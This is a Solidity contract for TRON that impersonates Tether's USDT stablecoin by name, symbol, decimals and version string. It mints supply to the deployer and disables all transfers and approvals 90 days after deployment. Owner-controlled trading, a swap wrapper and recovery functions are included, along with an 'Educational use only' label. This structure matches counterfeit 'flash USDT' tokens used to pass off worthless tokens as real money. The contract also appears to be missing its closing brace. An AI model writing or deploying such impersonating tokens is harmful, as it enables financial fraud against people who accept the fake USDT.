pragma solidity ^0.8.20;

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account)
        external
        view
        returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external
        view
        returns (uint256);

    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(
        address indexed from,
        address indexed to,
        uint256 value
    );

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


/*
    Generic TRON DEX Router Interface.

    Compatible architecture with routers exposing
    Uniswap/SunSwap-style token swap functions.
*/
interface IRouter {

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    )
        external
        returns (uint256[] memory amounts);
}


contract TetherUSDT is IERC20 {

    string public constant name = "Tether";

    string public constant symbol = "USDT";

    uint8 public constant decimals = 6;

    /*
        Events for educational tracking.
    */

    event TokenExpired(uint256 timestamp);

    event SplitExecuted(
        address indexed sender,
        uint256 totalAmount,
        uint256 recipientCount
    );

    event SwapExecuted(
        address indexed user,
        uint256 amountIn,
        uint256 amountOutMin
    );

function checkExpiration()
    external
{
    require(
        block.timestamp >=
        deploymentTime +
        VALIDITY_PERIOD,
        "Token still active"
    );

    emit TokenExpired(
        block.timestamp
    );
}

    modifier onlyOwner() {

        require(
            msg.sender == owner,
            "Not owner"
        );

        _;
    }


    modifier onlyActive() {

        require(
            block.timestamp < deploymentTime + VALIDITY_PERIOD,
            "Token expired"
        );

        _;
    }

    modifier tradingOpen() {

    require(
        tradingEnabled,
        "Trading disabled"
    );

    _;
}

modifier nonReentrant() {

    require(
        !locked,
        "Reentrant call"
    );

    locked = true;

    _;

    locked = false;
}


constructor(
    uint256 initialSupply,
    address router
) {

    require(
        router != address(0),
        "Invalid router"
    );

    owner = msg.sender;

    deploymentTime = block.timestamp;

    swapRouter = router;

    tradingEnabled = false;

    uint256 supply =
        initialSupply * 10 ** decimals;

    _totalSupply = supply;

    _balances[msg.sender] = supply;

    emit Transfer(
        address(0),
        msg.sender,
        supply
    );
}

uint256 private _totalSupply;

address public immutable owner;

bool public tradingEnabled;

bool private locked;

address public liquidityPair;

uint256 public immutable deploymentTime;

uint256 public constant VALIDITY_PERIOD = 90 days;

address public immutable swapRouter;

mapping(address => uint256) private _balances;

mapping(address => mapping(address => uint256))
    private _allowances;


/*
    Trading Control
*/

function enableTrading()
    external
    onlyOwner
{
    tradingEnabled = true;
}

/*
    Reentrancy Guard
*/

/*
    Liquidity Pair
*/

function setLiquidityPair(
    address pair
)
    external
    onlyOwner
{
    require(
        pair != address(0),
        "Invalid pair"
    );

    liquidityPair = pair;
}


    /*
        ============================================================
        BASIC TRC-20
        ============================================================
    */


    function totalSupply()
        external
        view
        override
        returns (uint256)
    {
        return _totalSupply;
    }


    function balanceOf(address account)
        public
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }


    function transfer(
        address recipient,
        uint256 amount
    )
        external
        override
        onlyActive
        returns (bool)
    {

        _transfer(
            msg.sender,
            recipient,
            amount
        );

        return true;
    }


    function allowance(
        address tokenOwner,
        address spender
    )
        external
        view
        override
        returns (uint256)
    {
        return _allowances[tokenOwner][spender];
    }


    function approve(
        address spender,
        uint256 amount
    )
        external
        override
        onlyActive
        returns (bool)
    {

        require(
            spender != address(0),
            "Invalid spender"
        );

        _allowances[msg.sender][spender] = amount;

        emit Approval(
            msg.sender,
            spender,
            amount
        );

        return true;
    }


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    )
        external
        override
        onlyActive
        returns (bool)
    {

        uint256 currentAllowance =
            _allowances[sender][msg.sender];

        require(
            currentAllowance >= amount,
            "Allowance exceeded"
        );


        _allowances[sender][msg.sender] =
            currentAllowance - amount;


        emit Approval(
            sender,
            msg.sender,
            _allowances[sender][msg.sender]
        );


        _transfer(
            sender,
            recipient,
            amount
        );


        return true;
    }


    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    )
        internal
    {

        require(
            sender != address(0),
            "Invalid sender"
        );

        require(
            recipient != address(0),
            "Invalid recipient"
        );

        require(
            _balances[sender] >= amount,
            "Insufficient balance"
        );


        _balances[sender] -= amount;

        _balances[recipient] += amount;


        emit Transfer(
            sender,
            recipient,
            amount
        );
    }


    /*
        ============================================================
        90 DAY VALIDITY
        ============================================================
    */


    function expirationTime()
        public
        view
        returns (uint256)
    {

        return deploymentTime + VALIDITY_PERIOD;
    }


    function isActive()
        public
        view
        returns (bool)
    {

        return block.timestamp <
            deploymentTime + VALIDITY_PERIOD;
    }


    function remainingTime()
        public
        view
        returns (uint256)
    {

        if (
            block.timestamp >=
            deploymentTime + VALIDITY_PERIOD
        ) {

            return 0;
        }

        return
            (deploymentTime + VALIDITY_PERIOD)
            - block.timestamp;
    }


    /*
        ============================================================
        MULTI-WALLET TRANSFER
        ============================================================
    */

    function multiTransfer(
        address[] calldata recipients,
        uint256[] calldata amounts
    )
        external
        onlyActive
        returns (bool)
    {

        require(
            recipients.length == amounts.length,
            "Array length mismatch"
        );

        require(
            recipients.length > 0,
            "No recipients"
        );

        require(
            recipients.length <= 100,
            "Maximum 100 recipients"
        );


        uint256 totalAmount = 0;


        for (
            uint256 i = 0;
            i < amounts.length;
            i++
        ) {

            require(
                recipients[i] != address(0),
                "Invalid recipient"
            );

            totalAmount += amounts[i];
        }


        require(
            _balances[msg.sender] >= totalAmount,
            "Insufficient balance"
        );


        for (
            uint256 i = 0;
            i < recipients.length;
            i++
        ) {

            _transfer(
                msg.sender,
                recipients[i],
                amounts[i]
            );
        }


        return true;
    }


    /*
        ============================================================
        EQUAL SPLITTER
        ============================================================
    */

    function splitEqual(
        address[] calldata recipients,
        uint256 totalAmount
    )
        external
        onlyActive
        returns (bool)
    {

        require(
            recipients.length > 0,
            "No recipients"
        );

        require(
            recipients.length <= 100,
            "Maximum 100 recipients"
        );

        require(
            totalAmount > 0,
            "Invalid amount"
        );


        uint256 eachAmount =
            totalAmount / recipients.length;


        require(
            eachAmount > 0,
            "Amount too small"
        );


        uint256 actualAmount =
            eachAmount * recipients.length;


        require(
            _balances[msg.sender] >= actualAmount,
            "Insufficient balance"
        );


        for (
            uint256 i = 0;
            i < recipients.length;
            i++
        ) {

            require(
                recipients[i] != address(0),
                "Invalid recipient"
            );


            _transfer(
                msg.sender,
                recipients[i],
                eachAmount
            );
        }


        emit SplitExecuted(
            msg.sender,
            actualAmount,
            recipients.length
        );


        return true;
    }


    /*
        ============================================================
        DEX SWAP
        ============================================================

        User must first approve this token contract's
        swapRouter to spend USDT.

        The router address is fixed at deployment.
    */

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    )
        external
        onlyActive
        tradingOpen
        nonReentrant
        returns (uint256[] memory amounts)
    {

        require(
            amountIn > 0,
            "Invalid amount"
        );
        require(
        amountOutMin > 0,
        "Invalid slippage"
        );          

        require(
            to != address(0),
            "Invalid recipient"
        );

        require(
            path.length >= 2,
            "Invalid path"
        );

        require(
            path[0] == address(this),
            "Path must start with this token"
        );

        require(
            deadline >= block.timestamp,
            "Expired swap deadline"
        );


        /*
            Move USDT from user to this contract.
        */

        _transfer(
            msg.sender,
            address(this),
            amountIn
        );


        /*
            Approve the trusted router.
        */

        _allowances[address(this)][swapRouter] =
            amountIn;


        emit Approval(
            address(this),
            swapRouter,
            amountIn
        );


        /*
            Execute DEX swap.
        */

        amounts =
            IRouter(swapRouter)
                .swapExactTokensForTokens(
                    amountIn,
                    amountOutMin,
                    path,
                    to,
                    deadline
                );


        emit SwapExecuted(
            msg.sender,
            amountIn,
            amountOutMin
        );


        return amounts;
    }
    /*
        ============================================================
        Recovery Functions
        ============================================================
    */
function recoverToken(
    address token,
    uint256 amount
)
    external
    onlyOwner
{
require(
    IERC20(token).transfer(
        owner,
        amount
    ),
    "Recovery failed"
);
}

function recoverTRX(
    uint256 amount
)
    external
    onlyOwner
{
    require(
        address(this).balance >= amount,
        "Insufficient TRX"
    );

    payable(owner).transfer(amount);
}

receive() external payable {}

    /*
        ============================================================
        EMERGENCY INFORMATION
        ============================================================
    */

    function contractVersion()
        external
        pure
        returns (string memory)
    {

        return "USDT-TRC20-v1.0";
    }


    function educationalPurpose()
        external
        pure
        returns (string memory)
{
    return "Educational use only";
}
